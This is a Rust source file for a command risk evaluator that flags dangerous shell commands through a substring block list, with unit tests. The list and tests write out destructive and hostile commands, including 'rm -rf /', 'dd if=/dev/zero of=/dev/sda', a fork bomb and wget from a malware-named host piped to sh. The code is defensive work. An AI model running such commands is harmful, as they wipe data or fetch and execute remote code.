//! High-Risk Command Risk Evaluator & Pattern Matcher (Issue #15).

use serde::{Deserialize, Serialize};

/// Command risk level.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum RiskLevel {
    Low,
    High,
}

impl RiskLevel {
    pub fn as_str(&self) -> &'static str {
        match self {
            RiskLevel::Low => "LOW",
            RiskLevel::High => "HIGH",
        }
    }
}

/// Evaluates command strings for high-risk flags.
pub struct CommandRiskEvaluator;

impl CommandRiskEvaluator {
    /// List of dangerous pattern rules.
    const DANGEROUS_SUBSTRINGS: &'static [&'static str] = &[
        "rm -rf",
        "rm -r ",
        "rm -f /",
        "rm -rf /",
        "shred ",
        "wipefs",
        "dd if=",
        "mkfs",
        "fdisk",
        "parted",
        "mkswap",
        "sudo ",
        "su -",
        "doas ",
        "chmod 777",
        "chmod -R 777",
        "chown -R",
        "reboot",
        "shutdown",
        "poweroff",
        "init 0",
        "curl | sh",
        "curl | bash",
        "curl | zsh",
        "wget | sh",
        "wget | bash",
        "wget | zsh",
        "git push --force",
        "git push -f",
        "git reset --hard",
        "apt purge",
        "drop database",
        "drop table",
        ":(){ :|:& };:",
    ];

    /// Evaluates if a command string is high-risk.
    pub fn evaluate(command: &str) -> RiskLevel {
        let cmd_clean = command.trim();
        if cmd_clean.is_empty() {
            return RiskLevel::Low;
        }

        let cmd_lower = cmd_clean.to_lowercase();

        for &pattern in Self::DANGEROUS_SUBSTRINGS {
            if cmd_lower.contains(&pattern.to_lowercase()) {
                return RiskLevel::High;
            }
        }

        // Also check regex-like patterns or combined pipes with shell evaluation
        if (cmd_lower.contains("curl") || cmd_lower.contains("wget")) && (cmd_lower.contains("| sh") || cmd_lower.contains("| bash") || cmd_lower.contains("| zsh")) {
            return RiskLevel::High;
        }

        RiskLevel::Low
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_evaluates_high_risk_commands() {
        let high_risk_cmds = vec![
            "rm -rf /",
            "rm -rf /data/user",
            "sudo apt update",
            "dd if=/dev/zero of=/dev/sda",
            "chmod 777 /etc/passwd",
            "chmod -R 777 .",
            "curl https://example.com/script.sh | bash",
            "wget http://malware.com/run | sh",
            "git reset --hard HEAD~1",
            "git push -f origin main",
            "reboot",
            "shutdown -h now",
            "mkfs.ext4 /dev/sdb1",
        ];

        for cmd in high_risk_cmds {
            assert_eq!(
                CommandRiskEvaluator::evaluate(cmd),
                RiskLevel::High,
                "Command failed to flag as HIGH risk: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_evaluates_safe_commands() {
        let safe_cmds = vec![
            "ls -la",
            "pwd",
            "echo 'Hello World'",
            "cat README.md",
            "git status",
            "git log -n 5",
            "cargo test",
            "./gradlew test",
            "grep -rn 'foo' .",
            "find . -name '*.kt'",
        ];

        for cmd in safe_cmds {
            assert_eq!(
                CommandRiskEvaluator::evaluate(cmd),
                RiskLevel::Low,
                "Command wrongly flagged as HIGH risk: {}",
                cmd
            );
        }
    }
}
